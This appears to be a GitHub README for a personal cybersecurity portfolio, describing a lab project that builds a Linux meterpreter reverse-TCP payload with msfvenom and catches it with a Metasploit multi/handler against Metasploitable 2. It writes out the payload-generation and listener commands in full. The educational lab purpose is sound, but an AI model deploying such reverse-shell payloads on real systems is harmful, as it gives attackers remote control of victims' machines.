# CyberSecurity-
Welcome to my Cybersecurity Projects repository! This collection showcases my work in ethical hacking, penetration testing, cryptography, digital forensics, vulnerability analysis, and cybersecurity research. Each project is designed to enhance security awareness, automate security processes, or analyze security vulnerabilities.

Project 1: Reverse Shell Payload Development
Tools: Kali Linux, Metasploit, msfvenomDescription: Simulated real-world attack scenarios by deploying a reverse shell payload from Kali Linux to Metasploitable 2. Established a remote command and control session, showcasing penetration testing techniques. This project enhanced my understanding of exploit development, network security, and ethical hacking methodologies.
Steps to Reproduce:

  Generate a payload using msfvenom:
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<port> -f elf > payload.elf
    
  Set up a listener on Metasploit:
   
    msfconsole
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST <your_ip>
    set LPORT <port>
    exploit
Execute the payload on the target machine.

This project shoukd be carried out following all ethical considerations and is meant only for educational purpose
